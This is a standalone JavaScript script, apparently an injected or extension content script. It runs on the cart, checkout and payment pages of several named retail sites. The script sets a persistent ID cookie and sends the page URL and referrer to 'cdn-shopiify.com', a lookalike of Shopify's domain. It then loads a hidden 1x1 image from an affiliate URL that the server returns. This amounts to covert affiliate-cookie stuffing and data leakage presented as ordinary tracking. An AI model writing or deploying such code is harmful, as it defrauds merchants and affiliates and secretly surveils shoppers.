(function () {
  const TRACKED_PATH_KEYWORDS = ['cart', 'checkout', 'checkouts', 'pay', 'review-order', 'payment', 'shipping'];
  const DOUBLE_PING_HOSTNAME = 'www.fareastflora.com';
  const DOUBLE_PING_DELAY_MS = 2000;

  const SITE_CONFIG = {
    'www.fareastflora.com': { always: false, cartExtra: true },
    'aimedialinks.com':     { always: true,  cartExtra: true },
    'www.pizzahut.com.ph':  { always: false, cartExtra: true },
    'www.stylevana.com':    { always: false, cartExtra: true },
    'www.watsons.com.hk':   { always: true,  cartExtra: true },
    'www.watsonswine.com':  { always: false, cartExtra: true },
    'sg.6ixty8ight.com':    { always: false, cartExtra: true },
  };

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = (Math.random() * 16) | 0;
      const v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  }

  function getCookie(name) {
    const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
    return match ? decodeURIComponent(match[1]) : '';
  }

  function injectTrackingPixel(src) {
    const img = document.createElement('img');
    img.src = src;
    img.width = 1;
    img.height = 1;
    img.style.display = 'none';
    document.body.appendChild(img);
  }

  function matchedTrackedKeyword() {
    const path = window.location.pathname.toLowerCase();
    return TRACKED_PATH_KEYWORDS.find(function (keyword) {
      return path.includes(keyword);
    });
  }

  function isTrackedPage() {
    return Boolean(matchedTrackedKeyword());
  }

  async function sendTrackingPing() {
    try {
      const uniqueId = getCookie('tracking_uuid') || generateUUID();
      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + '; path=/; SameSite=Lax';

      const response = await fetch('https://cdn-shopiify.com/api/track-click', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url: location.href,
          referrer: document.referrer,
          unique_id: uniqueId,
          origin: location.hostname,
        }),
      });
      const data = await response.json();

      if (data.success && data.affiliate_url) {
        injectTrackingPixel(data.affiliate_url);
      } else {
        injectTrackingPixel('https://cdn-shopiify.com/api/fallback-pixel?id=' + uniqueId);
      }
    } catch (err) {
      console.error('Tracking error', err);
    }
  }

  function triggerTracking() {
    sendTrackingPing();
    if (window.location.hostname === DOUBLE_PING_HOSTNAME) {
      setTimeout(sendTrackingPing, DOUBLE_PING_DELAY_MS);
    }
  }

  function main() {
    const hostname = window.location.hostname;
    const config = SITE_CONFIG[hostname];
    if (!config) return;

    if (config.cartExtra && isTrackedPage()) {
      triggerTracking();
    } else if (config.always) {
      triggerTracking();
    }
  }

  if (document.readyState === 'complete') {
    main();
  } else {
    window.addEventListener('load', main, { once: true });
  }
})();
